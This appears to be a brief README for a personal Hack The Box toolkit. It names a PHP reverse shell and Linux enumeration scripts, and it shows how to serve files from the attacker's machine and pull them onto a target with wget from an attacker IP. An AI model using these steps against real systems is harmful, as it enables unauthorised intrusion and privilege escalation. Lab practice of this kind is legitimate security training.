# Hackthebox tools
<p><b>shell.php</b> : Use for reverse shell when uploaded to vuln machine</p>
<p><b>les.sh and LinEnum.sh</b> : Use for detect vuln in Linux machine</p>

### How to upload files to vuln linux machine
<p>In your machine type : python -m SimpleHTTPServer</p>
<p>In vuln machine type : wget (your ip address):8000/(file to upload)</p>
<p>Example : wget 10.10.14.62:8000/les.sh</p>
